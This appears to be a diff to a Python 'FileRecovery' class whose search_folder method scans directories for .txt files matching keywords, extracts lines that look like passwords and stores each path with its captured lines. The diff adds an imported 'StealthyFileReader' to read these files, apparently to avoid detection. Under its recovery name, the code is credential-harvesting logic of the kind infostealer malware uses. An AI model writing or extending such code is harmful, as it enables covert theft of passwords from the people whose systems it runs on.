@@ -3,6 +3,8 @@ import threading
 import logging
 import json
 from Utilities.DataSaver import DataSaverUtility
+from Utilities.StealthReader import StealthyFileReader
+
 import string
 
 logging.basicConfig(level=logging.INFO)
@@ -39,19 +41,21 @@ class FileRecovery:
 
     def search_folder(self, path: str, keywords: list):
         try:
-            #logging.info(f"Searching in directory: {path}")
+
             files = os.listdir(path)
             for file in files:
-                if os.path.isfile(os.path.join(path, file)) and any(keyword in file.lower() for keyword in keywords) and file.endswith('.txt'):
-                    with open(os.path.join(path, file), 'r', encoding='utf-8', errors='ignore') as f:
-                        content = f.readlines()
-                        potential_passwords = [line.strip() for line in content if self.is_potential_password(line.strip())]
-                        if potential_passwords:
-                            self.files_found.append({
-                                "path": os.path.join(path, file),
-                                "content": potential_passwords
-                            })
-                            #logging.info(f"Found potential password in: {os.path.join(path, file)}")
+                file_path = os.path.join(path, file)
+                if os.path.isfile(file_path) and any(keyword in file.lower() for keyword in keywords) and file.endswith('.txt'):
+                    reader = StealthyFileReader(file_path)
+                    content = reader.read_text().splitlines()  # Split by lines
+                    print(f"Reading {file_path} using: {reader.method_used}")
+
+                    potential_passwords = [line.strip() for line in content if self.is_potential_password(line.strip())]
+                    if potential_passwords:
+                        self.files_found.append({
+                            "path": file_path,
+                            "content": potential_passwords
+                        })
         except Exception as e:
             logging.error(f"Error while searching in directory {path}: {e}")
 
